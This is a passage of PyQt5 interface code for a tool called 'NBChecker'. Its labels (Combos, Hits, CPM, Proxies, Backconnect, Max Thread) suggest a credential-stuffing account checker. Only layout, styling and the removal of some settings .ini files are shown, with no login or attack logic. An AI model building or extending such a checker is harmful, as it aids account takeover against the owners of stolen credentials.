        self.label_97.move(360, 470)
        self.label_97.resize(141, 21)
        self.label_97.setText("HTTP")
        self.label_97.setStyleSheet("font-family:微软雅黑;")
        self.pushButton_22 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_22.move(350, 470)
        self.pushButton_22.resize(141, 20)
        self.pushButton_22.setStyleSheet("background:transparent;")
        self.pushButton_23 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_23.move(350, 490)
        self.pushButton_23.resize(141, 20)
        self.pushButton_23.setStyleSheet("background:transparent;")
        self.label_101 = QtWidgets.QLabel(self.tab_2)
        self.label_101.move(360, 490)
        self.label_101.resize(141, 21)
        self.label_101.setText("No Proxy")
        self.label_101.setStyleSheet("font-family:微软雅黑;")
        self.label_66.setGeometry(QtCore.QRect(250, 55, 101, 31))
        self.label_66.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;\n"
"font-size:14px;")
        self.label_66.setObjectName("label_66")
        self.label_84 = QtWidgets.QLabel(self.tab_2)
        self.label_84.setGeometry(QtCore.QRect(550, 360, 101, 31))
        self.label_84.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_84.setObjectName("label_84")
        self.label_68 = QtWidgets.QLabel(self.tab_2)
        self.label_68.setEnabled(False)
        self.label_68.setGeometry(QtCore.QRect(260, 190, 531, 81))
        self.label_68.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_68.setText("")
        self.label_68.setObjectName("label_68")
        self.label_82 = QtWidgets.QLabel(self.tab_2)
        self.label_82.setEnabled(False)
        self.label_82.setGeometry(QtCore.QRect(525, 340, 261, 71))
        self.label_82.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_82.setText("")
        self.label_82.setObjectName("label_82")
        self.label_88 = QtWidgets.QLabel(self.tab_2)
        self.label_88.setGeometry(QtCore.QRect(410, 445, 60, 21))
        self.label_88.setStyleSheet("font-family:微软雅黑;\n"
"color:White;")
        self.label_88.setObjectName("label_88")
        self.label_71 = QtWidgets.QLabel(self.tab_2)
        self.label_71.setEnabled(False)
        self.label_71.setGeometry(QtCore.QRect(535, 90, 255, 81))
        self.label_71.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_71.setText("")
        self.label_71.setObjectName("label_71")
        self.label_85 = QtWidgets.QLabel(self.tab_2)
        self.label_85.setGeometry(QtCore.QRect(270, 440, 101, 31))
        self.label_85.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_85.setObjectName("label_85")
        self.label_65 = QtWidgets.QLabel(self.tab_2)
        self.label_65.setGeometry(QtCore.QRect(235, 15, 101, 31))
        self.label_65.setStyleSheet("font-family:微软雅黑;\n"
"color:White;\n"
"font-size:16px;")
        self.label_65.setObjectName("label_65")
        self.label_72 = QtWidgets.QLineEdit(self.tab_2)
        self.label_72.setGeometry(QtCore.QRect(420, 110, 35, 25))
        self.label_72.setStyleSheet("font-family:微软雅黑;\n"
"color:white;"
"background:transparent;")
        self.label_72.setObjectName("label_72")
        self.label_70 = QtWidgets.QLabel(self.tab_2)
        self.label_70.setGeometry(QtCore.QRect(420, 145, 35, 2))
        self.label_70.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_70.setText("")
        self.label_70.setObjectName("label_70")
        self.label_75 = QtWidgets.QLabel(self.tab_2)
        self.label_75.setGeometry(QtCore.QRect(700, 145, 35, 2))
        self.label_75.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_75.setText("")
        self.label_75.setObjectName("label_75")
        self.label_79 = QtWidgets.QLabel(self.tab_2)
        self.label_79.setEnabled(False)
        self.label_79.setGeometry(QtCore.QRect(255, 340, 261, 71))
        self.label_79.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_79.setText("")
        self.label_79.setObjectName("label_79")
        self.label_80 = QtWidgets.QLabel(self.tab_2)
        self.label_80.setEnabled(False)
        self.label_80.setGeometry(QtCore.QRect(255, 420, 531, 71))
        self.label_80.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_80.setText("")
        self.label_80.setObjectName("label_80")
        self.label_76 = QtWidgets.QLabel(self.tab_2)
        self.label_76.setGeometry(QtCore.QRect(280, 210, 121, 31))
        self.label_76.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_76.setObjectName("label_76")
        self.label_78 = QtWidgets.QLabel(self.tab_2)
        self.label_78.setGeometry(QtCore.QRect(175, 290, 691, 231))
        self.label_78.setText("")
        self.label_78.setPixmap(QtGui.QPixmap("res/bejing.png"))
        self.label_78.setScaledContents(True)
        self.label_78.setObjectName("label_78")
        self.label_64 = QtWidgets.QLabel(self.tab_2)
        self.label_64.setGeometry(QtCore.QRect(175, 40, 691, 271))
        self.label_64.setText("")
        self.label_64.setPixmap(QtGui.QPixmap("res/bejing.png"))
        self.label_64.setScaledContents(True)
        self.label_64.setObjectName("label_64")
        self.pushButton_18 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_18.setGeometry(QtCore.QRect(460, 218, 51, 20))
        self.pushButton_18.setStyleSheet("QPushButton{\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 0);\n"
"    border-radius: 10px;\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        self.pushButton_18.setText("")
        self.pushButton_18.setIconSize(QtCore.QSize(10, 10))
        self.pushButton_18.setObjectName("pushButton_18")
        self.label_73 = QtWidgets.QLabel(self.tab_2)
        self.label_73.setGeometry(QtCore.QRect(705, 110, 41, 31))
        self.label_73.setStyleSheet("font-family:微软雅黑;\n"
"color:white;")
        self.label_73.setObjectName("label_73")
        self.label_83 = QtWidgets.QLabel(self.tab_2)
        self.label_83.setGeometry(QtCore.QRect(270, 360, 101, 31))
        self.label_83.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_83.setObjectName("label_83")
        self.label_87 = QtWidgets.QLabel(self.tab_2)
        self.label_87.setGeometry(QtCore.QRect(700, 470, 55, 2))
        self.label_87.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_87.setText("")
        self.label_87.setObjectName("label_87")
        self.label_69 = QtWidgets.QLabel(self.tab_2)
        self.label_69.setGeometry(QtCore.QRect(280, 115, 101, 31))
        self.label_69.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_69.setObjectName("label_69")
        self.label_74 = QtWidgets.QLabel(self.tab_2)
        self.label_74.setGeometry(QtCore.QRect(560, 115, 101, 31))
        self.label_74.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_74.setObjectName("label_74")
        self.label_81 = QtWidgets.QLabel(self.tab_2)
        self.label_81.setGeometry(QtCore.QRect(250, 305, 101, 31))
        self.label_81.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;\n"
"font-size:14px;")
        self.label_81.setObjectName("label_81")
        self.label_67 = QtWidgets.QLabel(self.tab_2)
        self.label_67.setEnabled(False)
        self.label_67.setGeometry(QtCore.QRect(260, 90, 255, 81))
        self.label_67.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_67.setText("")
        self.label_67.setObjectName("label_67")
        self.label_77 = QtWidgets.QLabel(self.tab_2)
        self.label_77.setGeometry(QtCore.QRect(463, 220, 16, 16))
        self.label_77.setStyleSheet("border-radius: 10px;")
        self.label_77.setText("")
        self.label_77.setPixmap(QtGui.QPixmap("res/dry-clean.png"))
        self.label_77.setScaledContents(True)
        self.label_77.setObjectName("label_77")
        self.label_90 = QtWidgets.QLabel(self.tab_2)
        self.label_90.setGeometry(QtCore.QRect(710, 445, 61, 21))
        self.label_90.setStyleSheet("font-family:微软雅黑;\n"
"color:White;")
        self.label_90.setObjectName("label_90")
        self.label_89 = QtWidgets.QLabel(self.tab_2)
        self.label_89.setGeometry(QtCore.QRect(530, 440, 151, 31))
        self.label_89.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_89.setObjectName("label_89")
        self.pushButton_17 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_17.setGeometry(QtCore.QRect(630, 225, 131, 25))
        self.pushButton_17.setStyleSheet("QPushButton{\n"
"    color:White;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 60);\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        icon9 = QtGui.QIcon()
        icon9.addPixmap(QtGui.QPixmap("res/folder.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_17.setIcon(icon9)
        self.pushButton_17.setObjectName("pushButton_17")
        self.pushButton_20 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_20.setGeometry(QtCore.QRect(710, 370, 21, 21))
        self.pushButton_20.setStyleSheet("QPushButton{\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 60);\n"
"    border-radius: 10px;\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        self.pushButton_20.setText("")
        self.pushButton_20.setIcon(icon2)
        self.pushButton_20.setIconSize(QtCore.QSize(11, 11))
        self.pushButton_20.setObjectName("pushButton_20")
        self.pushButton_19 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_19.setGeometry(QtCore.QRect(440, 370, 21, 21))
        self.pushButton_19.setStyleSheet("QPushButton{\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 60);\n"
"    border-radius: 10px;\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        self.pushButton_19.setText("")
        self.pushButton_19.setIcon(icon2)
        self.pushButton_19.setIconSize(QtCore.QSize(11, 11))
        self.pushButton_19.setObjectName("pushButton_19")
        self.pushButton_21 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_21.setGeometry(QtCore.QRect(470, 445, 16, 16))
        self.pushButton_21.setStyleSheet("background:transparent;")
        self.pushButton_21.setText("")
        icon10 = QtGui.QIcon()
        icon10.addPixmap(QtGui.QPixmap("res/down.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_21.setIcon(icon10)
        self.pushButton_21.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_21.setObjectName("pushButton_21")
        self.label_63.raise_()
        self.label_78.raise_()
        self.label_80.raise_()
        self.label_64.raise_()
        self.label_67.raise_()
        self.label_82.raise_()
        self.label_79.raise_()
        self.label_86.raise_()
        self.label_66.raise_()
        self.label_84.raise_()
        self.label_68.raise_()
        self.label_88.raise_()
        self.label_71.raise_()
        self.label_85.raise_()
        self.label_65.raise_()
        self.label_72.raise_()
        self.label_70.raise_()
        self.label_75.raise_()
        self.label_76.raise_()
        self.label_73.raise_()
        self.label_83.raise_()
        self.label_87.raise_()
        self.label_69.raise_()
        self.label_74.raise_()
        self.label_81.raise_()
        self.label_77.raise_()
        self.label_90.raise_()
        self.label_89.raise_()
        self.pushButton_17.raise_()
        self.pushButton_20.raise_()
        self.pushButton_19.raise_()
        self.pushButton_21.raise_()
        self.pushButton_18.raise_()
        self.tabWidget.addTab(self.tab_2, "")
        self.tab_3 = QtWidgets.QWidget()
        self.tab_3.setObjectName("tab_3")
        self.label_91 = QtWidgets.QLabel(self.tab_3)
        self.label_91.setGeometry(QtCore.QRect(235, 15, 101, 31))
        self.label_91.setStyleSheet("font-family:微软雅黑;\n"
"color:White;\n"
"font-size:16px;")
        self.label_91.setObjectName("label_91")
        self.label_92 = QtWidgets.QLabel(self.tab_3)
        self.label_92.setGeometry(QtCore.QRect(175, 40, 681, 491))
        self.label_92.setText("")
        self.label_92.setPixmap(QtGui.QPixmap("res/bejing.png"))
        self.label_92.setScaledContents(True)
        self.label_92.setObjectName("label_92")
        self.label_93 = QtWidgets.QLabel(self.tab_3)
        self.label_93.setEnabled(False)
        self.label_93.setGeometry(QtCore.QRect(250, 90, 255, 81))
        self.label_93.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_93.setText("")
        self.label_93.setObjectName("label_93")
        self.label_94 = QtWidgets.QLabel(self.tab_3)
        self.label_94.setGeometry(QtCore.QRect(210, 0, 611, 531))
        self.label_94.setText("")
        self.label_94.setPixmap(QtGui.QPixmap("res/bg2.png"))
        self.label_94.setScaledContents(True)
        self.label_94.setObjectName("label_94")
        self.label_95 = QtWidgets.QLabel(self.tab_3)
        self.label_95.setGeometry(QtCore.QRect(285, 450, 40, 2))
        self.label_95.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_95.setText("")
        self.label_95.setObjectName("label_95")
        self.pushButton_2 = QtWidgets.QPushButton(self.tab_3)
        self.pushButton_2.setGeometry(QtCore.QRect(270, 420, 75, 23))
        self.pushButton_2.setStyleSheet("background:transparent;\n"
"font-family:微软雅黑;\n"
"color:white;")
        self.pushButton_2.setObjectName("pushButton_2")
        self.pushButton_24 = QtWidgets.QPushButton(self.tab_3)
        self.pushButton_24.setGeometry(QtCore.QRect(350, 420, 75, 23))
        self.pushButton_24.setStyleSheet("background:transparent;\n"
"font-family:微软雅黑;\n"
"color:Gray;")
        self.pushButton_24.setObjectName("pushButton_24")
        self.label_111 = QtWidgets.QLabel(self.tab_3)
        self.label_111.setGeometry(QtCore.QRect(290, 245, 131, 21))
        self.label_111.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_111.setObjectName("label_111")
        self.pushButton_startmusic = QtWidgets.QPushButton(self.tab_3)
        self.pushButton_startmusic.setGeometry(QtCore.QRect(510, 310, 41, 41))
        self.pushButton_startmusic.setStyleSheet("QPushButton{\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 60);\n"
"    border-radius: 20px;\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        self.pushButton_startmusic.setText("")
        icon11 = QtGui.QIcon()
        icon11.addPixmap(QtGui.QPixmap("res/play-button.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_startmusic.setIcon(icon11)
        self.pushButton_startmusic.setIconSize(QtCore.QSize(15, 18))
        self.pushButton_startmusic.setObjectName("pushButton_startmusic")
        self.label_109 = QtWidgets.QLabel(self.tab_3)
        self.label_109.setGeometry(QtCore.QRect(430, 275, 231, 31))
        self.label_109.setStyleSheet("font-family:微软雅黑;\n"
"color:White;")
        self.label_109.setObjectName("label_109")
        self.label_105 = QtWidgets.QLabel(self.tab_3)
        self.label_105.setGeometry(QtCore.QRect(290, 185, 121, 21))
        self.label_105.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_105.setObjectName("label_105")
        self.label_108 = QtWidgets.QLabel(self.tab_3)
        self.label_108.setGeometry(QtCore.QRect(430, 210, 101, 31))
        self.label_108.setStyleSheet("font-family:微软雅黑;\n"
"color:White;")
        self.label_108.setObjectName("label_108")
        self.label_110 = QtWidgets.QLabel(self.tab_3)
        self.label_110.setGeometry(QtCore.QRect(290, 280, 121, 21))
        self.label_110.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_110.setObjectName("label_110")
        self.label_100 = QtWidgets.QLabel(self.tab_3)
        self.label_100.setGeometry(QtCore.QRect(290, 115, 81, 21))
        self.label_100.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_100.setObjectName("label_100")
        self.pushButton_after = QtWidgets.QPushButton(self.tab_3)
        self.pushButton_after.setGeometry(QtCore.QRect(600, 315, 31, 31))
        self.pushButton_after.setStyleSheet("QPushButton{\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 60);\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        self.pushButton_after.setText("")
        icon12 = QtGui.QIcon()
        icon12.addPixmap(QtGui.QPixmap("res/next.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_after.setIcon(icon12)
        self.pushButton_after.setObjectName("pushButton_after")
        self.label_112 = QtWidgets.QLabel(self.tab_3)
        self.label_112.setGeometry(QtCore.QRect(430, 240, 101, 31))
        self.label_112.setStyleSheet("font-family:微软雅黑;\n"
"color:White;")
        self.label_112.setObjectName("label_112")
        self.label_99 = QtWidgets.QLabel(self.tab_3)
        self.label_99.setGeometry(QtCore.QRect(430, 145, 101, 31))
        self.label_99.setStyleSheet("font-family:微软雅黑;\n"
"color:White;")
        self.label_99.setObjectName("label_99")
        self.label_98 = QtWidgets.QLabel(self.tab_3)
        self.label_98.setGeometry(QtCore.QRect(290, 150, 131, 21))
        self.label_98.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_98.setObjectName("label_98")
        self.label_107 = QtWidgets.QLabel(self.tab_3)
        self.label_107.setGeometry(QtCore.QRect(290, 215, 121, 21))
        self.label_107.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_107.setObjectName("label_107")
        self.pushButton_before = QtWidgets.QPushButton(self.tab_3)
        self.pushButton_before.setGeometry(QtCore.QRect(430, 315, 31, 31))
        self.pushButton_before.setStyleSheet("QPushButton{\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 60);\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        self.pushButton_before.setText("")
        icon13 = QtGui.QIcon()
        icon13.addPixmap(QtGui.QPixmap("res/directional.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_before.setIcon(icon13)
        self.pushButton_before.setObjectName("pushButton_before")
        self.label_106 = QtWidgets.QLabel(self.tab_3)
        self.label_106.setGeometry(QtCore.QRect(430, 180, 101, 31))
        self.label_106.setStyleSheet("font-family:微软雅黑;\n"
"color:White;")
        self.label_106.setObjectName("label_106")
        self.label_94.raise_()
        self.label_91.raise_()
        self.label_93.raise_()
        self.label_92.raise_()
        self.label_95.raise_()
        self.pushButton_2.raise_()
        self.pushButton_24.raise_()
        self.label_111.raise_()
        self.pushButton_startmusic.raise_()
        self.label_109.raise_()
        self.label_105.raise_()
        self.label_108.raise_()
        self.label_110.raise_()
        self.label_100.raise_()
        self.pushButton_after.raise_()
        self.label_112.raise_()
        self.label_99.raise_()
        self.label_98.raise_()
        self.label_107.raise_()
        self.pushButton_before.raise_()
        self.label_106.raise_()
        self.label_113.raise_()
        self.tabWidget.addTab(self.tab_3, "")
        self.label_3 = QtWidgets.QLabel(self)
        self.label_3.setGeometry(QtCore.QRect(30, 10, 41, 41))
        self.label_3.setText("")
        self.label_3.setPixmap(QtGui.QPixmap("res/Breath.png"))
        self.label_3.setScaledContents(True)
        self.label_3.setObjectName("label_3")
        self.label_8 = QtWidgets.QLabel(self)
        self.label_8.setGeometry(QtCore.QRect(30, 450, 61, 21))
        self.label_8.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_8.setObjectName("label_8")
        self.label = QtWidgets.QLabel(self)
        self.label.setGeometry(QtCore.QRect(-10, 0, 225, 525))
        self.label.setText("")
        self.label.setPixmap(QtGui.QPixmap("res/bg1.png"))
        self.label.setScaledContents(True)
        self.label.setObjectName("label")
        self.label_13 = QtWidgets.QLabel(self)
        self.label_13.setGeometry(QtCore.QRect(110, 480, 91, 21))
        self.label_13.setStyleSheet("color:#3300CC;\n"
"font-family:微软雅黑;")
        self.label_13.setObjectName("label_13")
        self.pushButton = QtWidgets.QPushButton(self)
        self.pushButton.setGeometry(QtCore.QRect(0, 130, 211, 41))
        self.pushButton.setLayoutDirection(QtCore.Qt.RightToLeft)
        self.pushButton.setStyleSheet("QPushButton{\n"
"    border-radius:18px;\n"
"    color:White;\n"
"    font-family:微软雅黑;\n"
"    font-size:15px;    \n"
"    background:Transparent;\n"
"}")
        icon14 = QtGui.QIcon()
        icon14.addPixmap(QtGui.QPixmap("res/全透明.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton.setIcon(icon14)
        self.pushButton.setIconSize(QtCore.QSize(299, 16))
        self.pushButton.setObjectName("pushButton")
        self.label_11 = QtWidgets.QLabel(self)
        self.label_11.setGeometry(QtCore.QRect(30, 480, 81, 21))
        self.label_11.setStyleSheet("color:gray;\n"
"font-family:微软雅黑;")
        self.label_11.setObjectName("label_11")
        self.label_10 = QtWidgets.QLabel(self)
        self.label_10.setGeometry(QtCore.QRect(90, 450, 91, 21))
        self.label_10.setStyleSheet("color:#3300CC;\n"
"font-family:微软雅黑;")
        self.label_10.setObjectName("label_10")
        self.pushButton_4 = QtWidgets.QPushButton(self)
        self.pushButton_4.setGeometry(QtCore.QRect(0, 210, 211, 41))
        self.pushButton_4.setLayoutDirection(QtCore.Qt.RightToLeft)
        self.pushButton_4.setStyleSheet("QPushButton{\n"
"    border-radius:18px;\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    font-size:15px;    \n"
"    background:Transparent;\n"
"}")
        self.pushButton_4.setIcon(icon14)
        self.pushButton_4.setIconSize(QtCore.QSize(299, 16))
        self.pushButton_4.setObjectName("pushButton_4")
        self.label_6 = QtWidgets.QLabel(self)
        self.label_6.setGeometry(QtCore.QRect(0, 130, 5, 40))
        self.label_6.setText("")
        self.label_6.setPixmap(QtGui.QPixmap("res/标志.png"))
        self.label_6.setScaledContents(False)
        self.label_6.setObjectName("label_6")
        self.label_2 = QtWidgets.QLabel(self)
        self.label_2.setGeometry(QtCore.QRect(80, 10, 91, 31))
        self.label_2.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"font-size:16px;")
        self.label_2.setObjectName("label_2")
        self.pushButton_3 = QtWidgets.QPushButton(self)
        self.pushButton_3.setGeometry(QtCore.QRect(0, 170, 211, 41))
        self.pushButton_3.setLayoutDirection(QtCore.Qt.RightToLeft)
        self.pushButton_3.setStyleSheet("QPushButton{\n"
"    border-radius:18px;\n"
"    color:Gray;\n"
"    font-family:微软雅黑;\n"
"    font-size:15px;    \n"
"    background:Transparent;\n"
"}")
        self.pushButton_3.setIcon(icon14)
        self.pushButton_3.setIconSize(QtCore.QSize(299, 16))
        self.pushButton_3.setObjectName("pushButton_3")
        self.label_7 = QtWidgets.QLabel(self)
        self.label_7.setGeometry(QtCore.QRect(5, 130, 210, 41))
        self.label_7.setStyleSheet("color:Gray;\n"
"font-family:微软雅黑;\n"
"border-radius: 14px;")
        self.label_7.setText("")
        self.label_7.setPixmap(QtGui.QPixmap("res/bg2.png"))
        self.label_7.setScaledContents(True)
        self.label_7.setObjectName("label_7")
        self.pushButton_11 = QtWidgets.QPushButton(self)
        self.pushButton_11.setGeometry(QtCore.QRect(750, 20, 16, 16))
        self.pushButton_11.setStyleSheet("QPushButton{\n"
"    background:#6C6C6C;\n"
"    color:white;\n"
"    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 8px;font-family: 微软雅黑;\n"
"}\n"
"QPushButton:hover{                    \n"
"    background:#9D9D9D;\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 1px solid #3C3C3C!important;\n"
"}")
        self.pushButton_11.setText("")
        self.pushButton_11.setObjectName("pushButton_11")
        self.pushButton_12 = QtWidgets.QPushButton(self)
        self.pushButton_12.setGeometry(QtCore.QRect(780, 20, 16, 16))
        self.pushButton_12.setStyleSheet("QPushButton{\n"
"    background:#CE0000;\n"
"    color:white;\n"
"    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 8px;font-family: 微软雅黑;\n"
"}\n"
"QPushButton:hover{                    \n"
"    background:#FF2D2D;\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 1px solid #3C3C3C!important;\n"
"    background:#AE0000;\n"
"}")
        self.pushButton_12.setText("")
        self.pushButton_12.setObjectName("pushButton_12")
        self.tabWidget.raise_()
        self.label.raise_()
        self.label_7.raise_()
        self.label_3.raise_()
        self.label_8.raise_()
        self.label_13.raise_()
        self.label_11.raise_()
        self.label_10.raise_()
        self.pushButton_4.raise_()
        self.label_6.raise_()
        self.label_2.raise_()
        self.pushButton_3.raise_()
        self.pushButton.raise_()
        self.pushButton_11.raise_()
        self.pushButton_12.raise_()
        self.label_97.raise_()
        self.label_101.raise_()
        self.pushButton_22.raise_()
        self.pushButton_23.raise_()
        self.retranslateUi(self)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(self)
    def retranslateUi(self, Form):
        tempfilename = "C:\\Users\\" + getpass.getuser() + "\\Documents"
        try:
            os.remove(tempfilename + "\\CheckBox.ini")
        except:
            pass
        try:
            os.remove(tempfilename + "\\ToggleButton.ini")
        except:
            pass
        try:
            os.remove(tempfilename + "\\CheckBox_2.ini")
        except:
                pass
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "Form"))
        self.label_52.setText(_translate("Form", "Demos"))
        self.label_23.setText(_translate("Form", "Progress"))
        self.label_49.setText(_translate("Form", "Remaining"))
        self.label_17.setText(_translate("Form", "0"))
        self.label_18.setText(_translate("Form", "0"))
        self.label_14.setText(_translate("Form", "25.00%"))
        self.label_50.setText(_translate("Form", "CPM"))
        self.label_46.setText(_translate("Form", "Left"))
        self.pushButton_7.setText(_translate("Form", "Start"))
        self.label_47.setText(_translate("Form", "Hits"))
        self.label_16.setText(_translate("Form", "Combos"))
        self.label_45.setText(_translate("Form", "Checked"))
        self.label_12.setText(_translate("Form", "Name"))
        self.label_48.setText(_translate("Form", "Elapesed"))
        self.label_53.setText(_translate("Form", "Migrated"))
        self.label_4.setText(_translate("Form", "NBChecker"))
        self.label_19.setText(_translate("Form", "Proxies"))
        self.label_15.setText(_translate("Form", "Unnamed"))
        self.label_51.setText(_translate("Form", "Estimated"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("Form", "Tab 1"))
        self.label_66.setText(_translate("Form", "Check"))
        self.label_84.setText(_translate("Form", "Backconnect"))
        self.label_88.setText(_translate("Form", "HTTP"))
        self.label_85.setText(_translate("Form", "Proxy Mode"))
        self.label_65.setText(_translate("Form", "Configuration"))
        self.label_72.setText(_translate("Form", "50"))
        self.label_76.setText(_translate("Form", "Fix Username Error"))
        self.label_73.setText(_translate("Form", "2"))
        self.label_83.setText(_translate("Form", "Use"))
        self.label_69.setText(_translate("Form", "Max Thread: "))
        self.label_74.setText(_translate("Form", "Max Retries: "))
        self.label_81.setText(_translate("Form", "Proxies"))
